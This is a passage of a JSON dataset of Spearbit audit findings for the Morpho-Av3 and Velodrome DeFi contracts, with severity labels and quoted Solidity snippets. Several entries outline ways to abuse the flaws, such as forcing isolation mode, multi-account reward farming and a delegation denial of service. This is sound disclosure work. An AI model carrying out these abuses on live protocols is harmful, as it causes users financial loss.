            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Isolated assets are treated as collateral in Morpho",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Aave-v3 introduced isolation assets and isolation mode for users: \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation the mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\" The Morpho contract is intended not to be in isolation mode to avoid its restrictions. Supplying an isolated asset to Aave while there are already other (non-isolated) assets set as collateral will simply supply the asset to earn yield without setting it as collateral. However, Morpho will still set these isolated assets as collateral for the supplying user. Morpho users can borrow any asset against them which should not be possible:  Isolated assets are by definition riskier when used as collateral and should only allow borrowing up to a specific debt ceiling.  The borrows are not backed on Aave as the isolated asset is not treated as collateral there, lowering the Morpho Aave position's health factor and putting the system at risk of liquidation on Aave.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Morpho's logic to handle LTV = 0 AToken diverges from the Aave logic and could decrease the user's HF/borrowing power compared to what the same user would have on Aave",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The current implementation of Morpho has a specific logic to handle the scenario where Aave sets the asset's LTV to zero. We can see how Morpho is handling it in the _assetLiquidityData function function _assetLiquidityData(address underlying, Types.LiquidityVars memory vars) internal view returns (uint256 underlyingPrice, uint256 ltv, uint256 liquidationThreshold, uint256 tokenUnit) { ,! } // other function code... // If the LTV is 0 on Aave V3, the asset cannot be used as collateral to borrow upon a breaking withdraw. // In response, Morpho disables the asset as collateral and sets its liquidation threshold // to 0 and the governance should warn users to repay their debt. if (config.getLtv() == 0) return (underlyingPrice, 0, 0, tokenUnit); // other function code... The _assetLiquidityData function is used to calculate the number of assets a user can borrow and the maximum debt a user can reach before being liquidated. Those values are then used to calculate the user Health Factor. The Health Factor is used to  Calculate both if a user can be liquidated and in which percentage the collateral can be seized.  Calculate if a user can withdraw part of his/her collateral. The debt and borrowable amount are used in the Borrowing operations to know if a user is allowed to borrow the specified amount of tokens. On Aave, this situation is handled differently. First, there's a specific distinction when the liquidation threshold is equal to zero and when the Loan to Value of the asset is equal to zero. Note that Aave enforces (on the configuration setter of a reserve) that ltv must be <= of liquidationThreshold, this implies that if the LT is zero, the LTV must be zero. In the first case (liquidation threshold equal to zero) the collateral is not counted as collateral. This is the same behavior followed by Morpho, but the difference is that Morpho also follows it when the Liquidation Threshold is greater than zero. In the second case (LT > 0, LTV = 0) Aave still counts the collateral as part of the user's total collateral but does not increase the user's borrowing power (it does not increase the average LTV of the user). This influences the user's health factor (and so all the operations based on it) but not as impactfully as Morpho is doing. In conclusion, when the LTV of an asset is equal to zero, Morpho is not applying the same logic as Aave is doing, removing the collateral from the user's collateral and increasing the possibility (based on the user's health factor, user's debt, user's total collateral and all the asset's configurations on Aave) to  Deny a user's collateral withdrawal (while an Aave user could have done it).  Deny a user's borrow (while an Aave user could have done it).  Make a user liquidable (while an Aave user could have been healthy).  Increasing the possibility to allow the liquidator to seize the full collateral of the borrower (instead of 50%). 9",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk MorphoInternal.sol#L324,"
        ]
    },
    {
        "title": "RewardsManager does not take in account users that have supplied collateral directly to the pool",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Inside RewardsManager._getUserAssetBalances Morpho is calculating the amount of the supplied and borrowed balance for a specific user. In the current implementation, Morpho is ignoring the amount that the user has supplied as collateral directly into the Aave pool. As a consequence, the user will be eligible for fewer rewards or even zero in the case where he/she has supplied only collateral.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Accounting issue when repaying P2P fees while having a borrow delta",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When repaying debt on Morpho, any potential borrow delta is matched first. Repaying the delta should involve both decreasing the scaledDelta as well as decreasing the scaledP2PAmount by the matched amount. [1] However, the scaledP2PAmount update is delayed until the end of the repay function. The following repayFee call then reads the un-updated market.deltas.borrow.scaledP2PAmount storage variable leading to a larger estimation of the P2P fees that can be repaid. The excess fee that is repaid will stay in the contract and not be accounted for, when it should have been used to promote borrowers, increase idle supply or demote suppliers. For example, there could now be P2P suppliers that should have been demoted but are not and in reality don't have any P2P counterparty, leaving the entire accounting system in a broken state.  Example (all values are in underlying amounts for brevity.) Imagine a borrow delta of 1000, borrow.scaledP2PTotal = 10,000 supply.scaledP2PTotal = 8,000, so the repayable fee should be (10,000 - 1000) - (8,000 - 0) = 1,000. Now a P2P borrower wants to repay 3000 debt: 1. Pool repay: no pool repay as they have no pool borrow balance. 2. Decrease p2p borrow delta: decreaseDelta is called which sets market.deltas.borrow.scaledDelta = 0 (but does not update market.deltas.borrow.scaledP2PAmount yet!) and returns matchedBorrowDelta = 1000 3. repayFee is called and it computes (10,000 - 0) - (8,000 - 1,000) = 2,000. They repay more than the actual fee.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Repaying with ETH does not refund excess",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Users can repay WETH Morpho positions with ETH using the WETHGateway. The specified repay amount will be wrapped to WETH before calling the Morpho function to repay the WETH debt. However, the Morpho repay function only pulls in Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount). If the user specified an amount larger than their debt balance, the excess will be stuck in the WETHGateway contract. This might be especially confusing for users because the standard Morpho.repay function does not have this issue and they might be used to specifying a large, round value to be sure to repay all principal and accrued debt once the transaction is mined.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Morpho can end up in isolation mode",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Aave-v3 introduced isolation assets and isolation mode for users: \"Borrowers supplying an isolated asset as collateral cannot supply other assets as collateral (though they can still supply to capture yield). Only stablecoins that have been permitted by Aave governance to be borrowable in isolation the mode can be borrowed by users utilizing isolated collateral up to a specified debt ceiling.\" The Morpho contract has a single Aave position for all its users and does therefore not want to end up in isolation mode due to its restrictions. The Morpho code would still treat the supplied non-isolation assets as collateral for their Morpho users, allowing them to borrow against them, but the Aave position does not treat them as collateral anymore. Furthermore, Morpho can only borrow stablecoins up to a certain debt ceiling. Morpho can be brought into isolation mode:  Up to deployment, an attacker maliciously sends an isolated asset to the address of the proxy. Aave sets assets as collateral when transferred, such that the Morpho contract already starts out in isolation mode. This can even happen before deployment by precomputing addresses or simply frontrunning the deployment. This attack also works if Morpho does not intend to create a market for the isolated asset.  Upon deployment and market creation: An attacker or unknowing user is the first to supply an asset and this asset is an isolated asset, Morpho's Aave position automatically enters isolation mode.  At any time if an isolated asset is the only collateral asset. This can happen when collateral assets are turned off on Aave, for example, by withdrawing (or liquidating) the entire balance.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Collateral setters for Morpho / Aave can end up in a deadlock",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "One can end up in a deadlock where changing the Aave pool or Morpho collateral state is not possible anymore because it can happen that Aave automatically turns the collateral asset off (for example, when withdrawing everything / getting liquidated). Imagine a collateral asset is turned on for both protocols: setAssetIsCollateralOnPool(true) setAssetIsCollateral(true) Then, a user withdraws everything on Morpho / Aave, and Aave automatically turns it off. It's off on Aave but on on Morpho. It can't be turned on for Aave anymore because: if (market.isCollateral) revert Errors.AssetIsCollateralOnMorpho(); But it also can't be turned off on Morpho anymore because of: if (!_pool.getUserConfiguration(address(this)).isUsingAsCollateral(_pool.getReserveData(underlying).id) ) { revert Errors.AssetNotCollateralOnPool(); ,! ,! } c This will be bad if new users deposit after having withdrawn the entire asset. The asset is collateral on Morpho but not on Aave, breaking an important invariant that could lead to liquidating the Morpho Aave position.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "First reward claim is zero for newly listed reward tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When Aave adds a new reward token for an asset, the reward index for this (asset, reward) pair starts at 0. When an update in Morpho's reward manager occurs, it initializes all rewards for the asset and would initialize this new reward token with a startingIndex of 0. 1. Time passes and emissions accumulate to all pool users, resulting in a new index assetIndex. Users who deposited on the pool through Morpho before this reward token was listed should receive their fair share of the entire emission rewards (assetIndex - 0) * oldBalance but they currently receive zero because getRewards returns early if the user's computed index is 0. 2. Also note that the external getUserAssetIndex(address user, address asset, address reward) can be inaccurate because it doesn't simulate setting the startingIndex for reward tokens that haven't been set yet. 3. A smaller issue that can happen when new reward tokens are added is that updates to the startingIndex are late, the startingIndex isn't initialized to 0 but to some asset index that accrued emissions for some time. Morpho on-pool users would lose some rewards until the first update to the asset. (They should accrue from index 0 but accrue from startingIndex.) Given frequent calls to the RewardManager that initializes all rewards for an asset, this difference should be negligible.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Disable creating markets for siloed assets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Aave-v3 introduced siloed-borrow assets and siloed-borrow mode for users \"This feature allow assets with potentially manipulatable oracles (for example illiquid Uni V3 pairs) to be listed on Aave as single borrow asset i.e. if user borrows siloed asset, they cannot borrow any other asset. This helps mitigating the risk associated with such assets from impacting the overall solvency of the protocol.\" - Aave Docs The Morpho contract should not be in siloed-borrowing mode to avoid its restrictions on borrowing any other listed assets, especially as borrowing on the pool might be required for withdrawals. If a market for the siloed asset is created at deployment, users might borrow the siloed asset and break borrowing any of the other assets.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A high value of _defaultIterations could make the withdrawal and repay operations revert because of OOG",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When the user executes some actions, he/she can specify their own maxIterations parameter. The user maxIterations parameter is directly used in supplyLogic and borrowLogic. In the withdrawLogic Morpho is recalculating the maxIterations to be used internally as Math.max(_default- Iterations.withdraw, maxIterations) and in repayLogic is directly using _defaultIterations.repay as the max number of iterations. This parameter is used as the maximum number of iterations that the matching engine can do to match suppli- ers/borrowers during promotion/demotion operations. 15 function _promoteOrDemote( LogarithmicBuckets.Buckets storage poolBuckets, LogarithmicBuckets.Buckets storage p2pBuckets, Types.MatchingEngineVars memory vars ) internal returns (uint256 processed, uint256 iterationsDone) { if (vars.maxIterations == 0) return (0, 0); uint256 remaining = vars.amount; // matching engine code... for (; iterationsDone < vars.maxIterations && remaining != 0; ++iterationsDone) { // matching engine code (onPool, inP2P, remaining) = vars.step(...); // matching engine code... } // matching engine code... } As you can see, the iteration keeps going on until the matching engine has matched enough balance or the iterations have reached the maximum number of iterations. If the matching engine cannot match enough balance, it could revert because of OOG if vars.maxIterations is a high value. For the supply or borrow operations, the user is responsible for the specified number of iterations that might be done during the matching process, in that case, if the operations revert because of OGG, it's not an issue per se. The problem arises for withdraw and replay operations where Morpho is forcing the number of operations and could make all those transactions always revert in case the matching engine does not match enough balance in time. Keep in mind that even if the transaction does not revert during the _promoteOrDemote logic, it could revert during the following operations just because the _promoteOrDemote has consumed enough gas to make the following operations to use the remaining gas.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Morpho should check that the _positionsManager used has the same _E_MODE_CATEGORY_ID and _- ADDRESSES_PROVIDER values used by the Morpho contract itself",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Because _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER are immutable variables and because Morpho is calling the PositionsManager in a delegatecall context, it's fundamental that both Morpho and Posi- tionsManager have been initialized with the same _E_MODE_CATEGORY_ID and _ADDRESSES_PROVIDER values. Morpho should also check the value of the PositionsManager._E_MODE_CATEGORY_ID and PositionsManager._- ADDRESSES_PROVIDER in both the setPositionsManager and initialize function.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "In _authorizeLiquidate, when healthFactor is equal to Constants.DEFAULT_LIQUIDATION_THRESHOLD Morpho is wrongly setting close factor to DEFAULT_CLOSE_FACTOR",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When the borrower's healthFactor is equal to Constants.MIN_LIQUIDATION_THRESHOLD Morpho is returning the wrong value for the closeFactor allowing only liquidate 50% of the collateral instead of the whole amount. When the healthFactor is lower or equal to the Constants.MIN_LIQUIDATION_THRESHOLD Morpho should return Constants.MAX_CLOSE_FACTOR following the same logic applied by Aave. Note that the user cannot be liquidated even if healthFactor == MIN_LIQUIDATION_THRESHOLD if the priceOr- acleSentinel is set and IPriceOracleSentinel(params.priceOracleSentinel).isLiquidationAllowed() == false. See how Aave performs the check inside validateLiquidationCall.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_authorizeBorrow does not check if the Aave price oracle sentinel allows the borrowing operation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Inside the Aave validation logic for the borrow operation, there's an additional check that prevents the user from performing the operation if it has been not allowed inside the priceOracleSentinel require( params.priceOracleSentinel == address(0) || IPriceOracleSentinel(params.priceOracleSentinel).isBorrowAllowed(), Errors.PRICE_ORACLE_SENTINEL_CHECK_FAILED ); 17 Morpho should implement the same check. If for any reason the borrow operation has been disabled on Aave, it should also be disabled on Morpho itself. While the transaction would fail in case Morpho's user would need to perform the borrow on the pool, there could be cases where the user is completely matched in P2P. In those cases, the user would have performed a borrow even if the borrow operation was not allowed on the underlying Aave pool.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_updateInDS does not \"bubble up\" the updated values of onPool and inP2P",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The _updateInDS function takes as input uint256 onPool and uint256 inP2P that are passed not as reference, but as pure values. function _updateInDS( address poolToken, address user, LogarithmicBuckets.Buckets storage poolBuckets, LogarithmicBuckets.Buckets storage p2pBuckets, uint256 onPool, uint256 inP2P, bool demoting ) internal { if (onPool <= Constants.DUST_THRESHOLD) onPool = 0; if (inP2P <= Constants.DUST_THRESHOLD) inP2P = 0; // ... other logic of the function } Those values, if lower or equal to Constants.DUST_THRESHOLD will be set to 0. The issue is that the updated version of onPool and inP2P is never bubbled up to the original caller that will later use those values that could have been changed by the _updateInDS logic. For example, the _updateBorrowerInDS function call _updateInDS and relies on the value of onPool and inP2P to understand if the user should be removed or added to the list of borrowers. function _updateBorrowerInDS(address underlying, address user, uint256 onPool, uint256 inP2P, bool ,! demoting) internal { _updateInDS( _market[underlying].variableDebtToken, user, _marketBalances[underlying].poolBorrowers, _marketBalances[underlying].p2pBorrowers, onPool, inP2P, demoting ); if (onPool == 0 && inP2P == 0) _userBorrows[user].remove(underlying); else _userBorrows[user].add(underlying); } 18 Let's assume that inP2P and onPool passed as _updateBorrowerInDS inputs were equal to 1 (the value of DUST_- THRESHOLD). In this case, _updateInDS would update those values to zero because 1 <= DUST_THRESHOLD and would remove the user from both the poolBucket and p2pBuckets of the underlying. When then the function returns in the _updateBorrowerInDS context, the same user would not remove the under- lying from his/her _userBorrows list of assets because the updated values of onPool and inP2P have not been bubbled up by the _updateInDS function. The same conclusion could be made for all the \"root\" level codes that rely on the onPool and inP2P values that could not have been updated with the new 0 value set by _updateInDS.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "There is no guarantee that the _rewardsManager is set when calling claimRewards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Since the _rewardsManager address is set using a setter function in Morpho only and not in the MorphoStorage.sol constructor there is no guarantee that the _rewardsManager is not the default address(0) value. This could cause failures when calling claimRewards if Morpho forgets to set the _rewardsManager.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Its Impossible to set _isClaimRewardsPaused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The claimRewards function checks the isClaimRewardsPaused boolean value and reverts if it is true. Currently, there is no setter function in the code base that sets the _isClaimRewardsPaused boolean so it is impossible to change.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "User rewards can be claimed to treasury by DAO",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "When a user claims rewards, the rewards for the entire Morpho contract position on Aave are claimed. The excess rewards remain in the Morpho contract for until all users claimed their rewards. These rewards are not tracked and can be withdrawn by the DAO through a claimToTreasury call.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "decreaseDelta lib function should return early if amount == 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The passed in amount should be checked for a zero value, and in that condition, return early from the function. The way it currently is unnecessarily consumes more gas, and emits change events that for values that don't end up changing (newScaledDelta). Checking for amount == 0 is already being done in the increaseDelta function.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Smaller gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "There are several small expressions that can be further gas optimized.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Gas: Optimize LogarithmicBuckets.getMatch",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The getMatch function of the logarithmic bucket first checks for a bucket that is the next higher bucket If no higher bucket is found it searches for a bucket that is the than the bucket the provided value would be in. highest bucket that \"is in both bucketsMask and lowerMask.\" However, we already know that any bucket we can now find will be in lowerMask as lowerMask is the mask corresponding to all buckets less than or equal to value's bucket. Instead, we can just directly look for the highest bucket in bucketsMask.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider reverting the supplyCollateralLogic execution when amount.rayDivDown(poolSupplyIndex) is equal to zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "In Aave, when an AToken/VariableDebtToken is minted or burned, the transaction will revert if the amount divided by the index is equal to zero. You can see the check in the implementation of _mintScaled and _burnScaled functions in the Aave codebase. Morpho, with PR 688, has decided to prevent supply to the pool in this scenario to avoid a revert of the operation. Before the PR, if the user had supplied an amount for which amount.rayDivDown(poolSupplyIndex) would be equal to zero, the operation would have reverted at the Aave level during the mint operation of the AToken. With the PR, the operation will proceed because the supply to the Aave pool is skipped (see PoolLib.supplyToPool). Allowing this scenario in this specific context for the supplyCollateralLogic function will bring the following side effects:  The supplied user's amount will remain in Morpho's contract and will not be supplied to the Aave pool.  The user's accounting system is not updated because collateralBalance is increased by amount.rayDivDown(poolSupplyIndex) which is equal to zero. 21  If the marketBalances.collateral[onBehalf] was equal to zero (the user has never supplied the underly- ing to Morpho) the underlying token would be wrongly added to the _userCollaterals[onBehalf] storage, even if the amount supplied to Morpho (and to Aave) is equal to zero.  The user will not be able to withdraw the provided amount because the amount has not been accounted for in the storage.  Events.CollateralSupplied event is emitted even if the amount (used as an event parameter) has not been accounted to the user.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "WETHGateway does not validate the constructor's input parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The current implementation of the WETHGateway contracts does not validate the user's parameters during the constructor. In this specific case, the constructor should revert if morpho address is equal to ad- dress(0).",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing/wrong natspec, typos, minor refactors and renaming of variables to be more meaningful",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "In general, the current codebase does not cover all the functions, events, structs, or state variables with proper natspec. Below you can find a list of small specific improvements regarding typos, missing/wrong natspec, or suggestions to rename variables to a more meaningful/correct name  RewardsManager.sol#L28: consider renaming the balance variable in UserAssetBalance to scaledBalance  PositionsManagerInternal.sol#L289-L297, PositionsManagerInternal.sol#L352-L362: consider better docu- menting this part of the code because at first sight it's not crystal clear why the code is structured in this way. For more context, see the PR comment in the spearbit audit repo linked to it. 22  MorphoInternal.sol#L469-L521: consider moving the _calculateAmountToSeize function from MorphoInt- ernal to PositionsManagerInternal contract. This function is only used internally by the PositionsMan- agerInternal. Note that there could be more instances of these kinds of \"refactoring\" of the code inside other contracts.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "No validation checks on the newDefaultIterations struct",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The initialize function takes in a newDefaultIterations struct and does not perform validation for any of its fields.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "No validation check for newPositionsManager address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The initialize function does not ensure that the newPositionsManager is not a 0 address.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Natspec function documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The repayLogic function currently has Natspec documentation for every function argument except for the repayer argument.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "approveManagerWithSig user experience could be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "With the current implementation of the approveManagerWithSig signers must wait that the previous signers have consumed the nonce to be able to call approveManagerWithSig. Inside the function, there's a specific check that will revert if the signature has been signed with a nonce that is not equal to the current one assigned to the delegator, this means that signatures that use \"future\" nonce will not be able to be approved until previous nonce has been consumed. uint256 usedNonce = _userNonce[signatory]++; if (nonce != usedNonce) revert Errors.InvalidNonce(); Let's make an example: delegator want to allow 2 managers via signature 1) Generate sig_0 for manager1 with nonce_0. 2) Generate sig_1 for manager2 with nonce_1. 3) If no-one executes approveManagerWithSig(sig_0) the sig_1 (and all the signatures based on incremented nonces) cannot be executed. It's true that at some point someone/the signer will execute it.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing user markets check when liquidating",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "The liquidation does not check if the user who gets liquidated actually joined the collateral and borrow markets.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider reverting instead of returning zero inside repayLogic, withdrawLogic, withdrawCollater- alLogic and liquidateLogic function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Position manager always checks the user inputs via different validation functions. One of the vali- dations is that the input's amount must be greater than zero, otherwise, the transaction reverts with revert Er- rors.AmountIsZero(). The same behavior is not followed in those cases where the re-calculated amount is still zero. For example, in repayLogic after re-calculating the max amount that can be repaid by executing amount = Math.min(_getUserBorrowBalanceFromIndexes(underlying, onBehalf, indexes), amount); In this case, Morpho simply executes if (amount == 0) return 0; Note that liquidateLogic should be handled differently because both the borrow amount and/or the collateral amount could be equal to zero. In this case, it would be better to revert with a different custom error based on which of the two amounts are equal to zero.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "PERMIT2 operations like transferFrom2 and simplePermit2 will revert if amount is greater than type(uint160).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Both Morpho.sol and PositionsManager.sol uses the Permit2 lib. The current implementation of the permit2 lib explicitly restricts the amount of token to uint160 by calling amount.toUint160() On Morpho, the amount is expressed as a uint256 and the user could, in theory, pass an amount that is greater than type(uint160).max. By doing so, the transaction would revert when it interacts with the permit2 lib.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Both _wrapETH and _unwrapAndTransferETH do not check if the amount is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Both _wrapETH and _unwrapAndTransferETH are not checking if the amount amount of tokens is greater than zero. If the amount is equal to zero, Morpho should avoid making the external call or simply revert.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document further contraints on BucketDLL's insert and remove functions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf",
        "body": "Besides the constraint that id may not be zero, there are further constraints that are required for the insert and remove functions to work correctly:  insert: \"This function should not be called with an _id that is already in the list.\" Otherwise, it would overwrite the existing _id.  remove: \"This function should not be called with an _id that is not in the list.\" Otherwise, it would set all of _list.accounts[0] to address(0), i.e., mark the list as empty.",
        "labels": [
            "Spearbit",
            "Morpho-Av3",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reward calculates earned incorrectly on each epoch boundary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Rewards are allocated on a per epoch basis to users in proportion to their total deposited amount. Because the balance and total supply used for rewards is based on _currTs % WEEK + WEEK, the values will not represent the end of the current epoch, but instead the first second of the next epoch. As a result, if a user deposits at any epoch boundary, their deposited amount will actually contribute to the check- pointed total supply of the prior epoch. This leads to a few issues which are detailed below:  Users who deposit in the first second of the next epoch will dilute the total supply for the prior epoch while not being eligible to claim rewards for that same epoch. Consequently, some rewards will be left unclaimed and locked within the contract as the tokenRewardsPerEpoch mapping is used to store reward amounts so unclaimed rewards will not roll over to future epochs.  Users can also avoid zero numEpochs by depositing a negligible amount at an earlier epoch for multiple ac- counts before attempting to deposit a larger amount at _currTs % WEEK == 0. The same user can withdraw their deposit from the VotingEscrow contract with the claimed rewards and re-deposit these funds into an- other account in the same block. They are able to abuse this issue to claim all rewards allocated to each epoch.  In a similar fashion, reward distributions that are weighted by users' votes in the Voter contract can suffer the same issue as outlined above. If the attacker votes some negligible amount on various pools using several accounts, they can increase the vote, claim, reset the vote and re-vote via another account to claim rewards multiple times. The math below shows that _currTs + WEEK is indeed the first second of the next epoch and not the last of the prior epoch. 6 uint256 internal constant WEEK = 7 days; function epochStart(uint256 timestamp) internal pure returns (uint256) { return timestamp - (timestamp % WEEK); } epochStart(123) Type: uint Hex: 0x0 Decimal: 0 epochStart(100000000) Type: uint Hex: 0x5f2b480 Decimal: 99792000 WEEK Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(1 + WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(0 + WEEK) Type: uint Hex: 0x93a80 Decimal: 604800 epochStart(WEEK - 1) Type: uint Hex: 0x0 Decimal: 0",
        "labels": [
            "Spearbit",
            "Velodrome",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "DOS attack by delegating tokens at MAX_DELEGATES = 1024",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf",
        "body": "Any user can delegate the balance of the locked NFT amount to anyone by calling delegate. As the delegated tokens are maintained in an array that's vulnerable to DOS attack, the VotingEscrowhas a safety check of MAX_DELEGATES = 1024 preventing an address from having a huge array. Given the current implementation, any user with 1024 delegated tokens takes approximately 23M gas to transfer/burn/mint a token. However, the current gas limit of the op chain is 15M. (ref: Op-scan)  The current votingEscrow has a limit of MAX_DELEGATES=1024. it's approx 23M to transfer/withdraw a token when there are 1024 delegated voting on a token.  It's cheaper to delegate from an address with a shorter token list to an address with a longer token list. => If someone trying to attack a victim's address by creating a new address, a new lock, and delegating to the victim. By the time the attacker hit the gas limit, the victim can not withdraw/transfer/delegate.",
        "labels": [
            "Spearbit",
            "Velodrome",
